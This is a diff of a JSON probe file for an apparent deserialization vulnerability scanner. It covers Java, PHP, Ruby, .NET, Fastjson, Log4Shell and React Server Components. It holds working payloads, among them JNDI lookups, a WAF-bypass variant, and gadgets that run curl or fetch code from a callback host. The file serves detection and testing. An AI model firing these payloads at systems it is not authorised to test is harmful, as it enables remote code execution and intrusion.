@@ -21,7 +21,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "Java serialized object detection — look for magic bytes rO0AB or ACED0005 in base64",
+          "description": "Java serialized object detection \u2014 look for magic bytes rO0AB or ACED0005 in base64",
           "matchers": [
             {
               "type": "regex",
@@ -33,7 +33,7 @@
         },
         {
           "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",
-          "description": "Java HashSet gadget chain (base64) — triggers deserialization; look for 500 error or timing anomaly indicating RCE attempt",
+          "description": "Java HashSet gadget chain (base64) \u2014 triggers deserialization; look for 500 error or timing anomaly indicating RCE attempt",
           "matchers": [
             {
               "type": "status",
@@ -56,7 +56,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "ObjectInputStream error leak — check error messages for Java deserialization stack traces",
+          "description": "ObjectInputStream error leak \u2014 check error messages for Java deserialization stack traces",
           "matchers": [
             {
               "type": "word",
@@ -113,7 +113,7 @@
         },
         {
           "payload": "a:1:{s:4:\"test\";s:4:\"test\";}",
-          "description": "PHP array unserialization probe — accepted without error indicates unserialize() is called",
+          "description": "PHP array unserialization probe \u2014 accepted without error indicates unserialize() is called",
           "matchers": [
             {
               "type": "status",
@@ -135,7 +135,7 @@
         },
         {
           "payload": "O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}",
-          "description": "PHP object with role=admin — check if privilege escalation via deserialization",
+          "description": "PHP object with role=admin \u2014 check if privilege escalation via deserialization",
           "matchers": [
             {
               "type": "status",
@@ -173,7 +173,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "Insecure object deserialization — detect serialized object magic bytes in responses (gASV prefix = Python serialized object)",
+          "description": "Insecure object deserialization \u2014 detect serialized object magic bytes in responses (gASV prefix = Python serialized object)",
           "matchers": [
             {
               "type": "regex",
@@ -235,7 +235,7 @@
       "probes": [
         {
           "payload": "BAhvOghGb28GOg==",
-          "description": "Ruby Marshal payload (base64) — look for 'marshal' in error messages or unexpected 500 indicating Ruby object deserialization",
+          "description": "Ruby Marshal payload (base64) \u2014 look for 'marshal' in error messages or unexpected 500 indicating Ruby object deserialization",
           "matchers": [
             {
               "type": "regex",
@@ -248,7 +248,7 @@
       ]
     },
     "log4shell": {
-      "description": "Log4Shell (CVE-2021-44228) — JNDI injection via Log4j lookups. Collaborator-based detection (checking interactions after sending probe) is strongly preferred over timing-only detection for reliable confirmation.",
+      "description": "Log4Shell (CVE-2021-44228) \u2014 JNDI injection via Log4j lookups. Collaborator-based detection (checking interactions after sending probe) is strongly preferred over timing-only detection for reliable confirmation.",
       "tech_match": [
         "Java",
         "Tomcat",
@@ -273,7 +273,7 @@
       "probes": [
         {
           "payload": "${jndi:ldap://{{callback}}/a}",
-          "description": "Log4Shell JNDI lookup — if Log4j processes this, it makes an outbound LDAP/DNS connection to the callback. Use Collaborator interactions as primary signal; header changes (Set-Cookie, error headers) or timing diff as secondary indicators.",
+          "description": "Log4Shell JNDI lookup \u2014 if Log4j processes this, it makes an outbound LDAP/DNS connection to the callback. Use Collaborator interactions as primary signal; header changes (Set-Cookie, error headers) or timing diff as secondary indicators.",
           "matchers": [
             {
               "type": "not_word",
@@ -294,7 +294,7 @@
         },
         {
           "payload": "${${lower:j}ndi:${lower:l}dap://{{callback}}/a}",
-          "description": "Log4Shell WAF bypass variant — nested lookups reconstruct 'jndi:ldap' at runtime, evading static keyword filters. Check Collaborator for DNS/LDAP interactions as primary detection method.",
+          "description": "Log4Shell WAF bypass variant \u2014 nested lookups reconstruct 'jndi:ldap' at runtime, evading static keyword filters. Check Collaborator for DNS/LDAP interactions as primary detection method.",
           "matchers": [
             {
               "type": "not_word",
@@ -317,7 +317,7 @@
       ]
     },
     "fastjson": {
-      "description": "Fastjson deserialization — @type auto-type feature enables RCE via JNDI or class instantiation gadgets",
+      "description": "Fastjson deserialization \u2014 @type auto-type feature enables RCE via JNDI or class instantiation gadgets",
       "tech_match": [
         "Java",
         "Spring",
@@ -334,7 +334,7 @@
       "probes": [
         {
           "payload": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"{{callback}}\"}",
-          "description": "Fastjson Inet4Address gadget — triggers DNS resolution to callback if auto-type is enabled, confirming deserialization",
+          "description": "Fastjson Inet4Address gadget \u2014 triggers DNS resolution to callback if auto-type is enabled, confirming deserialization",
           "matchers": [
             {
               "type": "timing",
@@ -353,7 +353,7 @@
         },
         {
           "payload": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{{callback}}/Exploit\",\"autoCommit\":true}",
-          "description": "Fastjson JdbcRowSetImpl JNDI gadget — triggers outbound LDAP connection via auto-type deserialization, enabling RCE",
+          "description": "Fastjson JdbcRowSetImpl JNDI gadget \u2014 triggers outbound LDAP connection via auto-type deserialization, enabling RCE",
           "matchers": [
             {
               "type": "timing",
@@ -388,7 +388,7 @@
       "probes": [
         {
           "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){return 1}()\"}",
-          "description": "node-serialize IIFE gadget — if node-serialize library is used and input unserialized, IIFE executes",
+          "description": "node-serialize IIFE gadget \u2014 if node-serialize library is used and input unserialized, IIFE executes",
           "matchers": [
             {
               "type": "status",
@@ -413,7 +413,7 @@
       ]
     },
     "java_commons_collections": {
-      "description": "Java Commons Collections gadget chain detection — probes for CC1-CC7 deserialization gadgets via error message fingerprinting",
+      "description": "Java Commons Collections gadget chain detection \u2014 probes for CC1-CC7 deserialization gadgets via error message fingerprinting",
       "tech_match": [
         "Java",
         "Tomcat",
@@ -433,7 +433,7 @@
       "probes": [
         {
           "payload": "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBn",
-          "description": "Commons Collections LazyMap gadget (truncated base64) — ClassNotFoundException or InvokerTransformer in error confirms CC library is on classpath and deserialization occurs",
+          "description": "Commons Collections LazyMap gadget (truncated base64) \u2014 ClassNotFoundException or InvokerTransformer in error confirms CC library is on classpath and deserialization occurs",
           "matchers": [
             {
               "type": "status",
@@ -458,7 +458,7 @@
         },
         {
           "payload": "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u",
-          "description": "Java BadAttributeValueExpException gadget (base64) — triggers toString() chain; error mentioning BadAttributeValueExpException confirms deserialization path",
+          "description": "Java BadAttributeValueExpException gadget (base64) \u2014 triggers toString() chain; error mentioning BadAttributeValueExpException confirms deserialization path",
           "matchers": [
             {
               "type": "status",
@@ -483,7 +483,7 @@
       ]
     },
     "spring_framework": {
-      "description": "Spring Framework deserialization — Spring-specific gadget chains and SpEL-based deserialization attacks",
+      "description": "Spring Framework deserialization \u2014 Spring-specific gadget chains and SpEL-based deserialization attacks",
       "tech_match": [
         "Spring",
         "Spring Boot",
@@ -500,7 +500,7 @@
       "probes": [
         {
           "payload": "rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXI=",
-          "description": "Spring SerializableTypeWrapper gadget (base64) — Spring-specific class in error message confirms Spring deserialization is reachable",
+          "description": "Spring SerializableTypeWrapper gadget (base64) \u2014 Spring-specific class in error message confirms Spring deserialization is reachable",
           "matchers": [
             {
               "type": "status",
@@ -524,7 +524,7 @@
         },
         {
           "payload": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://{{callback}}\"]]]]",
-          "description": "SnakeYAML deserialization probe — if Spring uses SnakeYAML for config parsing, triggers outbound connection to callback via URLClassLoader; check Collaborator for DNS interaction",
+          "description": "SnakeYAML deserialization probe \u2014 if Spring uses SnakeYAML for config parsing, triggers outbound connection to callback via URLClassLoader; check Collaborator for DNS interaction",
           "matchers": [
             {
               "type": "status",
@@ -568,7 +568,7 @@
       "probes": [
         {
           "payload": "AAEAAAD/////AQAAAAAAAAAEAQAAAA9TeXN0ZW0uSW50MzJbXQEAAAAITG93Qm91bmQIAAAAAAAAAA==",
-          "description": ".NET BinaryFormatter Int32 array probe (base64) — safe object that triggers deserialization; error mentioning BinaryFormatter or SerializationException confirms .NET deserialization is active",
+          "description": ".NET BinaryFormatter Int32 array probe (base64) \u2014 safe object that triggers deserialization; error mentioning BinaryFormatter or SerializationException confirms .NET deserialization is active",
           "matchers": [
             {
               "type": "status",
@@ -592,7 +592,7 @@
         },
         {
           "payload": "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"><ObjectDataProvider MethodName=\"Start\" ObjectType=\"{x:Type diagnostics:Process}\"><ObjectDataProvider.MethodParameters><sys:String>calc</sys:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>",
-          "description": ".NET XAML ObjectDataProvider detection — XAML parsing error or Process reference in error confirms XAML deserialization attack surface (detection only, does not execute)",
+          "description": ".NET XAML ObjectDataProvider detection \u2014 XAML parsing error or Process reference in error confirms XAML deserialization attack surface (detection only, does not execute)",
           "matchers": [
             {
               "type": "status",
@@ -618,7 +618,7 @@
       ]
     },
     "ruby_yaml_load": {
-      "description": "Ruby YAML.load unsafe deserialization — Ruby Psych YAML parser allows arbitrary object instantiation",
+      "description": "Ruby YAML.load unsafe deserialization \u2014 Ruby Psych YAML parser allows arbitrary object instantiation",
       "tech_match": [
         "Ruby",
         "Rails"
@@ -635,7 +635,7 @@
       "probes": [
         {
           "payload": "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: http://{{callback}}/yaml",
-          "description": "Ruby YAML Gem::Requirement gadget — triggers DNS/HTTP callback via Gem::Source fetch; check Collaborator for interaction. Psych or ArgumentError in error confirms YAML parsing",
+          "description": "Ruby YAML Gem::Requirement gadget \u2014 triggers DNS/HTTP callback via Gem::Source fetch; check Collaborator for interaction. Psych or ArgumentError in error confirms YAML parsing",
           "matchers": [
             {
               "type": "status",
@@ -661,7 +661,7 @@
         },
         {
           "payload": "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\nfoo: bar",
-          "description": "Rails NamedRouteCollection YAML gadget — Rails-specific class in error message confirms Rails YAML deserialization surface",
+          "description": "Rails NamedRouteCollection YAML gadget \u2014 Rails-specific class in error message confirms Rails YAML deserialization surface",
           "matchers": [
             {
               "type": "status",
@@ -688,7 +688,7 @@
       ]
     },
     "jboss_bshdeployer_mbean": {
-      "description": "JBoss JMX BSHDeployer MBean accepts BeanShell script → RCE. Classic chain via /jmx-console/HtmlAdaptor.",
+      "description": "JBoss JMX BSHDeployer MBean accepts BeanShell script \u2192 RCE. Classic chain via /jmx-console/HtmlAdaptor.",
       "tech_match": [
         "JBoss"
       ],
@@ -696,7 +696,7 @@
       "probes": [
         {
           "payload": "exec(\"curl http://{{collaborator}}\")",
-          "description": "Invoke BSHDeployer.createScriptDeployment with BeanShell exec — Collaborator HTTP hit confirms RCE",
+          "description": "Invoke BSHDeployer.createScriptDeployment with BeanShell exec \u2014 Collaborator HTTP hit confirms RCE",
           "matchers": [
             {
               "type": "collaborator",
@@ -714,7 +714,7 @@
       ]
     },
     "jackson_polymorphic_rce": {
-      "description": "Jackson polymorphic deserialisation with @type → ClassPathXmlApplicationContext fetches attacker XML → RCE.",
+      "description": "Jackson polymorphic deserialisation with @type \u2192 ClassPathXmlApplicationContext fetches attacker XML \u2192 RCE.",
       "tech_match": [
         "jackson",
         "spring"
@@ -723,7 +723,7 @@
       "probes": [
         {
           "payload": "{\"@type\":\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"_path\":\"http://{{collaborator}}/x.xml\"}",
-          "description": "Polymorphic @type triggers Spring context fetch — Collaborator HTTP hit confirms",
+          "description": "Polymorphic @type triggers Spring context fetch \u2014 Collaborator HTTP hit confirms",
           "matchers": [
             {
               "type": "collaborator",
@@ -740,44 +740,114 @@
       ]
     },
     "magento_mirasvit_php_unserialize_rce_2026": {
-      "description": "CVE-2026-45247 (CISA KEV, actively exploited) — Mirasvit Cache Warmer extension for Magento accepts attacker-controlled serialized PHP objects via specific cache-related HTTP params. Reaches PHP unserialize() with no class allowlist; gadget chain (commonly Magento\\Framework\\Phrase or Symfony __destruct gadgets) → arbitrary PHP code execution. Pre-auth, CVSS 9.8.",
-      "tech_match": ["magento", "magento2", "mirasvit", "adobe-commerce", "php"],
-      "param_match": ["cache", "cache_data", "session", "data", "warmer", "queue"],
+      "description": "CVE-2026-45247 (CISA KEV, actively exploited) \u2014 Mirasvit Cache Warmer extension for Magento accepts attacker-controlled serialized PHP objects via specific cache-related HTTP params. Reaches PHP unserialize() with no class allowlist; gadget chain (commonly Magento\\Framework\\Phrase or Symfony __destruct gadgets) \u2192 arbitrary PHP code execution. Pre-auth, CVSS 9.8.",
+      "tech_match": [
+        "magento",
+        "magento2",
+        "mirasvit",
+        "adobe-commerce",
+        "php"
+      ],
+      "param_match": [
+        "cache",
+        "cache_data",
+        "session",
+        "data",
+        "warmer",
+        "queue"
+      ],
       "probes": [
         {
           "payload": "TzoxOToiTWFnZW50b1xcRnJhbWV3b3JrXFxQaHJhc2UiOjI6e3M6OToiX19jbGFzcyI6czoxNDoiU3lzdGVtRXhlYyI7czo4OiJfX3RleHQiOnM6MzI6ImN1cmwgaHR0cDovL0NPTExBQk9SQVRPUiI7fQ==",
-          "description": "Base64-encoded canary PHP-serialized object — Magento Phrase + SystemExec-shaped gadget invoking curl to Collaborator. Vulnerable site processes unserialize() and the gadget triggers an outbound HTTP callback. Replace COLLABORATOR with operator's host at runtime.",
+          "description": "Base64-encoded canary PHP-serialized object \u2014 Magento Phrase + SystemExec-shaped gadget invoking curl to Collaborator. Vulnerable site processes unserialize() and the gadget triggers an outbound HTTP callback. Replace COLLABORATOR with operator's host at runtime.",
           "matchers": [
-            {"type": "collaborator", "interaction_types": ["HTTP", "DNS"]}
+            {
+              "type": "collaborator",
+              "interaction_types": [
+                "HTTP",
+                "DNS"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 85,
-          "variables": {"manual_chain": true, "requires_collaborator": true, "content_type": "application/x-www-form-urlencoded", "actively_exploited": true}
+          "variables": {
+            "manual_chain": true,
+            "requires_collaborator": true,
+            "content_type": "application/x-www-form-urlencoded",
+            "actively_exploited": true
+          }
         },
         {
           "payload": "O:8:\"stdClass\":1:{s:6:\"canary\":s:13:\"SWK_MAGENTO_42\"}",
-          "description": "Plain PHP serialized canary — no gadget; just confirms the endpoint accepts and processes serialized data without rejecting unknown classes. Reflection of the canary string indicates the unsafe deserialization path is reachable.",
+          "description": "Plain PHP serialized canary \u2014 no gadget; just confirms the endpoint accepts and processes serialized data without rejecting unknown classes. Reflection of the canary string indicates the unsafe deserialization path is reachable.",
           "matchers": [
-            {"type": "word", "words": ["SWK_MAGENTO_42", "stdClass", "unserialize"], "condition": "or"},
-            {"type": "status", "status": [200, 500]}
+            {
+              "type": "word",
+              "words": [
+                "SWK_MAGENTO_42",
+                "stdClass",
+                "unserialize"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true, "content_type": "application/x-www-form-urlencoded"}
+          "variables": {
+            "manual_chain": true,
+            "content_type": "application/x-www-form-urlencoded"
+          }
         }
       ]
     },
     "java_gadgets": {
       "description": "Java deserialization gadget detection -- identify exploitable Java serialized objects in requests/responses",
-      "tech_match": ["Java", "Spring", "Tomcat", "JBoss", "WebLogic", "WebSphere"],
-      "param_match": ["data", "object", "serialized", "viewstate", "state", "payload", "session", "token"],
+      "tech_match": [
+        "Java",
+        "Spring",
+        "Tomcat",
+        "JBoss",
+        "WebLogic",
+        "WebSphere"
+      ],
+      "param_match": [
+        "data",
+        "object",
+        "serialized",
+        "viewstate",
+        "state",
+        "payload",
+        "session",
+        "token"
+      ],
       "probes": [
         {
           "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAEAAAABdAAEdGVzdHQABHRlc3R4",
           "description": "Java serialized HashMap (harmless) -- if accepted without error, endpoint deserializes user-controlled objects",
           "matchers": [
-            {"type": "status", "status": [200, 500]},
-            {"type": "not_word", "words": ["deserialization disabled", "ObjectInputStream not allowed", "ClassNotFound"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "deserialization disabled",
+                "ObjectInputStream not allowed",
+                "ClassNotFound"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 55
@@ -786,7 +856,15 @@
           "payload": "{{baseline}}",
           "description": "Check for Java serialization markers in responses -- aced0005 magic bytes (base64: rO0AB) indicate serialized Java objects in transport",
           "matchers": [
-            {"type": "word", "words": ["rO0AB", "aced0005", "java.io.Serializable"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "rO0AB",
+                "aced0005",
+                "java.io.Serializable"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -795,15 +873,42 @@
     },
     "php_unserialize": {
       "description": "PHP object injection via unserialize() -- user-controlled data enables arbitrary object instantiation",
-      "tech_match": ["PHP", "Laravel", "Symfony", "WordPress", "Drupal"],
-      "param_match": ["data", "object", "serialized", "cookie", "session", "token", "payload"],
+      "tech_match": [
+        "PHP",
+        "Laravel",
+        "Symfony",
+        "WordPress",
+        "Drupal"
+      ],
+      "param_match": [
+        "data",
+        "object",
+        "serialized",
+        "cookie",
+        "session",
+        "token",
+        "payload"
+      ],
       "probes": [
         {
           "payload": "O:8:\"stdClass\":1:{s:4:\"test\";s:6:\"canary\";}",
           "description": "PHP serialized stdClass -- if processed without error, unserialize() accepts user input",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "not_word", "words": ["unserialize", "not allowed", "invalid"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "unserialize",
+                "not allowed",
+                "invalid"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
@@ -812,15 +917,38 @@
     },
     "ruby_yaml": {
       "description": "Ruby YAML deserialization -- YAML.load processes arbitrary Ruby objects including command execution gadgets",
-      "tech_match": ["Ruby", "Rails", "Sinatra"],
-      "param_match": ["data", "config", "yaml", "import", "content"],
+      "tech_match": [
+        "Ruby",
+        "Rails",
+        "Sinatra"
+      ],
+      "param_match": [
+        "data",
+        "config",
+        "yaml",
+        "import",
+        "content"
+      ],
       "probes": [
         {
           "payload": "--- !ruby/object:Gem::Installer\ni: x",
           "description": "Ruby YAML object instantiation probe -- if Gem::Installer is recognized, unsafe YAML.load is in use",
           "matchers": [
-            {"type": "word", "words": ["Gem::Installer", "NoMethodError", "undefined method"], "condition": "or"},
-            {"type": "status", "status": [500]}
+            {
+              "type": "word",
+              "words": [
+                "Gem::Installer",
+                "NoMethodError",
+                "undefined method"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60
@@ -829,17 +957,93 @@
     },
     "python_unsafe_deser": {
       "description": "Python unsafe deserialization -- user input passed to unsafe deserialization functions enables code execution",
-      "tech_match": ["Python", "Django", "Flask", "FastAPI"],
-      "param_match": ["data", "object", "session", "state", "serialized"],
+      "tech_match": [
+        "Python",
+        "Django",
+        "Flask",
+        "FastAPI"
+      ],
+      "param_match": [
+        "data",
+        "object",
+        "session",
+        "state",
+        "serialized"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "Check for Python serialization markers in cookies/parameters -- gASV prefix (base64) or specific byte patterns indicate unsafe deserialization in transport",
           "matchers": [
-            {"type": "word", "words": ["gASV", "unpickling", "deserialize"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "gASV",
+                "unpickling",
+                "deserialize"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 50
+        }
+      ]
+    },
+    "react2shell_rsc_rce_2025": {
+      "description": "React2Shell (CVE-2025-55182): Critical unauthenticated RCE via insecure deserialization in React Server Components Flight protocol. Affects react-server-dom-webpack/parcel/turbopack 19.0.0-19.2.0 and Next.js 15.x-16.x with App Router. CVSS 10.0, CISA KEV, active exploitation by Chinese APT groups. CWE-502.",
+      "tech_match": [
+        "react",
+        "nextjs",
+        "next.js",
+        "next",
+        "vercel"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Detect RSC Flight protocol \u2014 look for text/x-component content-type or RSC streaming markers in response",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "text/x-component|__flight__|rsc_|ReactServerComponent|__rsc_inline"
+            }
+          ]
+        },
+        {
+          "payload": "0:[\"$\",\"div\",null,{\"children\":\"$undefined\"}]",
+          "description": "RSC Flight payload probe \u2014 send a minimal RSC row. If the server processes it, the endpoint accepts Flight protocol input (pre-condition for React2Shell)",
+          "matchers": [
+            {
+              "type": "status",
+              "value": "200"
+            },
+            {
+              "type": "word",
+              "words": [
+                "$",
+                "children",
+                "div"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "Content-Type: text/x-component\r\n\r\n0:[\"$\",\"__react_server__\",null,{}]",
+          "description": "RSC content-type switch \u2014 force the server to parse the body as Flight protocol (the deserialization entry point)",
+          "matchers": [
+            {
+              "type": "status_not",
+              "value": "415"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "Unsupported Media Type"
+              ]
+            }
+          ],
+          "reference_only": true
         }
       ]
     }
